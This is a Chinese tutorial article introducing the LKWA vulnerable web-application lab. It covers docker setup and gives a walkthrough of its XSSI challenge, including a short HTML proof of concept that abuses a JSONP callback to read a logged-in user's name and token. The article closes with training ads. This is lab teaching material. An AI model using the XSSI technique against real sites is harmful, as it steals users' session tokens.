<div class="title-image"><img src="https://pic4.zhimg.com/v2-a5228b41200835be44afc1c60763dead_b.jpg" alt=""></div><p>就像标题所说，这是一个不同寻常的 web 攻击靶场，包含了 8 种鲜为人知的 web 攻击方式，常见的 XSS 漏洞在这里就没有了。</p><p>例如跨站点脚本包含（XSSI），PHP 对象注入（简单注入，cookie，对象引用），PHAR反序列化，SSRF 和变量 variable。</p><h2>LKWA</h2><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/weev3/LKWA</span><span class="invisible"></span></a></p><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg" data-caption="" data-size="small" data-rawwidth="1861" data-rawheight="957" class="origin_image zh-lightbox-thumb" width="1861" data-original="https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg" data-caption="" data-size="small" data-rawwidth="1861" data-rawheight="957" class="origin_image zh-lightbox-thumb lazy" width="1861" data-original="https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg"/></figure><h2>docker 一键搭建</h2><p><b>环境</b></p><p>win10</p><p>先下载项目到本地：<a href="https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/weev3/LKWA</span><span class="invisible"></span></a></p><p>使用它自带的 docker-compose 进行构建（跳转到项目目录下）</p><div class="highlight"><pre><code class="language-text">docker-compose build</code></pre></div><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg" data-caption="" data-size="small" data-rawwidth="1041" data-rawheight="238" class="origin_image zh-lightbox-thumb" width="1041" data-original="https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg" data-caption="" data-size="small" data-rawwidth="1041" data-rawheight="238" class="origin_image zh-lightbox-thumb lazy" width="1041" data-original="https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg"/></figure><p>然后开启容器</p><div class="highlight"><pre><code class="language-text">docker-compose up -d</code></pre></div><p>访问 <a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A3000/" class=" wrap external" target="_blank" rel="nofollow noreferrer">http://127.0.0.1:3000</a> 即可</p><p><b>列表</b></p><ul><li>盲 RCE</li><li>XSSI</li><li>PHAR 反序列化</li><li>PHP 对象注入</li><li>通过 Cookie 的 PHP 对象注入</li><li>PHP对象注入（对象参考）</li><li>通过 Cookie 的 PHP 对象注入</li><li>SSRF</li><li>变量变量</li></ul><blockquote>在测试 PHAR 反序列化之前，您需要在 php.ini 设置中将 phar.readonly = On 更改为 phar.readonly = Off </blockquote><h2>TEST-XSSI</h2><p><b>什么是XSSI：</b></p><p><a href="https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">stackoverflow.com/quest</span><span class="invisible">ions/8028511/what-is-cross-site-script-inclusion-xssi</span><span class="ellipsis"></span></a> </p><p>浏览器已实现了 SOP 等安全功能，可防止从一个来源加载的文档或脚本如何与另一个来源的资源进行交互。它有助于隔离潜在的恶意文档，从而减少可能的攻击媒介。</p><p>例如，站点 A 实现的 example.js 和站点 B 希望从站点 A 读取 example.js。这将被 SOP 阻止。但是，如果站点 A 使用 JSONP，则站点 B 可以读取该 js 文件。</p><p><b>题解</b></p><p>进入题目</p><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg" data-caption="" data-size="small" data-rawwidth="976" data-rawheight="456" class="origin_image zh-lightbox-thumb" width="976" data-original="https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg" data-caption="" data-size="small" data-rawwidth="976" data-rawheight="456" class="origin_image zh-lightbox-thumb lazy" width="976" data-original="https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg"/></figure><p>提示提交用户名 admin，密码 password</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg" data-caption="" data-size="small" data-rawwidth="963" data-rawheight="442" class="origin_image zh-lightbox-thumb" width="963" data-original="https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg" data-caption="" data-size="small" data-rawwidth="963" data-rawheight="442" class="origin_image zh-lightbox-thumb lazy" width="963" data-original="https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg"/></figure><p>目标是窃取用户和 Token</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg" data-caption="" data-size="small" data-rawwidth="949" data-rawheight="196" class="origin_image zh-lightbox-thumb" width="949" data-original="https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg" data-caption="" data-size="small" data-rawwidth="949" data-rawheight="196" class="origin_image zh-lightbox-thumb lazy" width="949" data-original="https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg"/></figure><p>尝试登录后，进入一个个人信息页面</p><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg" data-caption="" data-size="small" data-rawwidth="974" data-rawheight="286" class="origin_image zh-lightbox-thumb" width="974" data-original="https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg" data-caption="" data-size="small" data-rawwidth="974" data-rawheight="286" class="origin_image zh-lightbox-thumb lazy" width="974" data-original="https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg"/></figure><p>查看 js，观察到用户名和 token 是使用 ajax 检索的</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg" data-caption="" data-size="normal" data-rawwidth="973" data-rawheight="378" class="origin_image zh-lightbox-thumb" width="973" data-original="https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg" data-caption="" data-size="normal" data-rawwidth="973" data-rawheight="378" class="origin_image zh-lightbox-thumb lazy" width="973" data-original="https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg"/></figure><p>创建一个 api 接口获取信息</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg" data-caption="" data-size="small" data-rawwidth="1114" data-rawheight="480" class="origin_image zh-lightbox-thumb" width="1114" data-original="https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg" data-caption="" data-size="small" data-rawwidth="1114" data-rawheight="480" class="origin_image zh-lightbox-thumb lazy" width="1114" data-original="https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg"/></figure><p>窃取用户和 token 的POC</p><div class="highlight"><pre><code class="language-text">&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;XSSI&lt;/title&gt;    
  &lt;/head&gt;
&lt;body&gt;
    &lt;script&gt;
        function a(s)
        {
        alert(JSON.stringify(s));
        }
    &lt;/script&gt;
    &lt;script src=&#34;http://localhost:8081/LKWA/api/user?callback=a&#34;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></div><p>使用</p><div class="highlight"><pre><code class="language-text">php -S localhost:9000</code></pre></div><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg" data-caption="" data-size="normal" data-rawwidth="871" data-rawheight="97" class="origin_image zh-lightbox-thumb" width="871" data-original="https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg" data-caption="" data-size="normal" data-rawwidth="871" data-rawheight="97" class="origin_image zh-lightbox-thumb lazy" width="871" data-original="https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg"/></figure><p>浏览网址之后。就可以获取用户名和 token</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg" data-caption="" data-size="normal" data-rawwidth="469" data-rawheight="268" class="origin_image zh-lightbox-thumb" width="469" data-original="https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg" data-caption="" data-size="normal" data-rawwidth="469" data-rawheight="268" class="origin_image zh-lightbox-thumb lazy" width="469" data-original="https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg"/></figure><p><a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg" data-caption="" data-size="normal" data-rawwidth="3058" data-rawheight="1720" class="origin_image zh-lightbox-thumb" width="3058" data-original="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg" data-caption="" data-size="normal" data-rawwidth="3058" data-rawheight="1720" class="origin_image zh-lightbox-thumb lazy" width="3058" data-original="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg"/></figure><p>更多有关渗透测试的内容请前往<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 <b>twosecurity02</b></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb lazy" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg"/></figure>